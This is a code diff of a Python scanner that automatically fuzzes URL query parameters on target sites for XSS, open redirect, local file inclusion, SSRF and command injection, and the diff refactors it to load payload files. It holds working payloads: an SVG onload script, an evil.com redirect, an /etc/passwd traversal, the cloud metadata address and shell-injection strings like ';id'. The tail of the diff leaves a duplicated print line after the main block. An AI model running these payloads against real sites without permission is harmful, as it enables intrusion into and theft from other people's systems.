@@ -2,19 +2,13 @@
 import warnings
 warnings.simplefilter("ignore")  # Ignore ALL warnings
 
-import argparse
-import os
-import re
+import argparse, os, re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 from colorama import Fore, Style, init
-
 import urllib3
 urllib3.disable_warnings()
-
-
-
 
 init(autoreset=True)
 
@@ -33,13 +27,20 @@ BANNER = f"""{Fore.LIGHTCYAN_EX}
 {Style.RESET_ALL}
 """
 
-PAYLOADS = {
-    "xss": '"><svg/onload=alert(1)>',
-    "redirect": "https://evil.com",
-    "lfi": "../../../../etc/passwd",
-    "ssrf": "http://169.254.169.254/latest/meta-data/",
+PAYLOAD_FILES = {
+    "xss": "payloads/xss.txt",
+    "redirect": "payloads/redirect.txt",
+    "lfi": "payloads/lfi.txt",
+    "ssrf": "payloads/ssrf.txt",
+    "rce": "payloads/rce.txt",
 }
-
+DEFAULT_PAYLOADS = {
+    "xss": ['"><svg/onload=alert(1)>'],
+    "redirect": ["https://evil.com"],
+    "lfi": ["../../../../etc/passwd"],
+    "ssrf": ["http://169.254.169.254/latest/meta-data/"],
+    "rce": [";id", "|id", "&&id", "`id`", "$(id)", "||id"],
+}
 MATCHES = {
     "xss": re.compile(r'(q=|s=|search=|callback=|return=|next=|url=)', re.I),
     "redirect": re.compile(r'(redirect|url|next|target)', re.I),
@@ -48,34 +49,35 @@ MATCHES = {
     "rce": re.compile(r'(cmd=|exec=|command=|run=|process=|shell=|cli=|query=|call=)', re.I),
 }
 
-RCE_PAYLOADS = [
-    ";id",
-    "|id",
-    "&&id",
-    "`id`",
-    "$(id)",
-    "||id",
-]
+def load_payloads(vulntype):
+    file = PAYLOAD_FILES[vulntype]
+    if os.path.exists(file):
+        with open(file) as f:
+            lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            if lines:
+                return lines
+    return DEFAULT_PAYLOADS[vulntype]
 
 def fuzz_url(url, vulntype, payload=None):
-    parsed = urlparse(url)
-    qs = parse_qsl(parsed.query, keep_blank_values=True)
-    changed = False
-    new_qs = []
-    for k, v in qs:
-        if not changed and MATCHES[vulntype].search(f"{k}="):
-            new_qs.append((k, payload or PAYLOADS[vulntype]))
-            changed = True
-        else:
-            new_qs.append((k, v))
-    if not changed:
-        return None, None
-    new_query = urlencode(new_qs)
-    new_url = urlunparse(parsed._replace(query=new_query))
     try:
+        parsed = urlparse(url)
+        qs = parse_qsl(parsed.query, keep_blank_values=True)
+        changed = False
+        new_qs = []
+        for k, v in qs:
+            if not changed and MATCHES[vulntype].search(f"{k}="):
+                new_qs.append((k, payload))
+                changed = True
+            else:
+                new_qs.append((k, v))
+        if not changed:
+            return None, None
+        new_query = urlencode(new_qs)
+        new_url = urlunparse(parsed._replace(query=new_query))
+        r = None
         if vulntype == "redirect":
             r = requests.head(new_url, allow_redirects=False, timeout=8, verify=False)
-            if r.is_redirect and PAYLOADS[vulntype] in r.headers.get('Location', ''):
+            if r.is_redirect and payload in r.headers.get('Location', ''):
                 return new_url, f"[Redirect] {new_url}"
         elif vulntype == "xss":
             r = requests.get(new_url, timeout=8, verify=False)
@@ -97,24 +99,21 @@ def fuzz_url(url, vulntype, payload=None):
         pass
     return None, None
 
-def scan_type(urls, vulntype, outfile, max_threads=20, rce_payloads=None):
+def scan_type(urls, vulntype, outfile, max_threads=20):
+    payloads = load_payloads(vulntype)
     hits = []
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = {}
-        if vulntype == "rce" and rce_payloads:
-            for url in urls:
-                for payload in rce_payloads:
-                    futures[executor.submit(fuzz_url, url, vulntype, payload)] = (url, payload)
-        else:
-            for url in urls:
-                futures[executor.submit(fuzz_url, url, vulntype)] = url
+        for url in urls:
+            for payload in payloads:
+                futures[executor.submit(fuzz_url, url, vulntype, payload)] = (url, payload)
         for fut in as_completed(futures):
             try:
                 res_url, result = fut.result()
                 if result:
                     print(Fore.GREEN + f"{result}" + Style.RESET_ALL)
                     hits.append(result)
-            except Exception as e:
+            except Exception:
                 pass
     with open(outfile, "w") as f:
         for hit in hits:
@@ -147,30 +146,21 @@ def main():
 
     print(BANNER)
     with open(args.input) as f:
-        urls = [line.strip() for line in f if "=" in line]
+        urls = [line.strip() for line in f if "=" in line and not line.startswith("#")]
 
-    print(Fore.CYAN + f"[*] Scanning for XSS..." + Style.RESET_ALL)
-    xss_urls = [u for u in urls if MATCHES["xss"].search(u)]
-    scan_type(xss_urls, "xss", os.path.join(args.output, "xss_hits.txt"), args.threads)
-
-    print(Fore.CYAN + f"[*] Scanning for Open Redirects..." + Style.RESET_ALL)
-    redirect_urls = [u for u in urls if MATCHES["redirect"].search(u)]
-    scan_type(redirect_urls, "redirect", os.path.join(args.output, "redirect_hits.txt"), args.threads)
-
-    print(Fore.CYAN + f"[*] Scanning for LFI..." + Style.RESET_ALL)
-    lfi_urls = [u for u in urls if MATCHES["lfi"].search(u)]
-    scan_type(lfi_urls, "lfi", os.path.join(args.output, "lfi_hits.txt"), args.threads)
-
-    print(Fore.CYAN + f"[*] Scanning for SSRF..." + Style.RESET_ALL)
-    ssrf_urls = [u for u in urls if MATCHES["ssrf"].search(u)]
-    scan_type(ssrf_urls, "ssrf", os.path.join(args.output, "ssrf_hits.txt"), args.threads)
-
-    print(Fore.CYAN + f"[*] Scanning for RCE..." + Style.RESET_ALL)
-    rce_urls = [u for u in urls if MATCHES["rce"].search(u)]
-    scan_type(rce_urls, "rce", os.path.join(args.output, "rce_hits.txt"), args.threads, RCE_PAYLOADS)
+    for vulntype in ["xss", "redirect", "lfi", "ssrf", "rce"]:
+        print(Fore.CYAN + f"[*] Scanning for {vulntype.upper()}..." + Style.RESET_ALL)
+        vt_urls = [u for u in urls if MATCHES[vulntype].search(u)]
+        scan_type(vt_urls, vulntype, os.path.join(args.output, f"{vulntype}_hits.txt"), args.threads)
 
     print(Fore.CYAN + "[*] Scanning for interesting JS endpoints..." + Style.RESET_ALL)
     scan_js_endpoints(urls, os.path.join(args.output, "js_hits.txt"))
+
+    print(Fore.GREEN + f"[+] All results saved in {args.output}/" + Style.RESET_ALL)
+
+if __name__ == "__main__":
+    main()
+
 
     print(Fore.GREEN + f"[+] All results saved in {args.output}/" + Style.RESET_ALL)
 
